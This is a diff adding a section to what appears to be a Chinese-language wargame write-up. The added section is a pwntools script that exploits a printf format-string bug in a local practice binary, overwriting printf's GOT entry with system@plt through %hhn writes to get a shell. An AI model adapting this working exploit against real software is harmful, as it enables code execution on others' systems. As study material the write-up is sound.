@@ -206,6 +206,42 @@ r.interactive()
 
 ```
 
+用 angelboy 上課教的方式寫
+```python
+#!/usr/bin/env python
+from pwn import *
+context.arch = 'i386'
+r = process('/tmp/p/a')
+
+def fmt(prev,val,idx):
+    result = ""
+    if prev < val:
+        result += "%" + str(val - prev) + "c"
+    elif prev == val:
+        pass
+    else:
+        result += "%" + str(val - prev + 256) + "c"
+    result += "%" + str(idx) + "$hhn"
+    return result
+
+printf_got = 0x804a010
+system_plt = 0x8048400
+
+payload = ""
+prev = 0
+for i in range(4):
+  payload += fmt(prev, (system_plt >> i * 8) & 0xff , i+23 )
+  prev = (system_plt >> i * 8) & 0xff
+  
+payload = payload.ljust(0x40, "a")
+payload += ''.join([p32(printf_got + i) for i in range(4)])
+r.sendline(payload)
+
+r.interactive()
+
+## 7
+```
+
 ## smashthestack
 
 先看保護
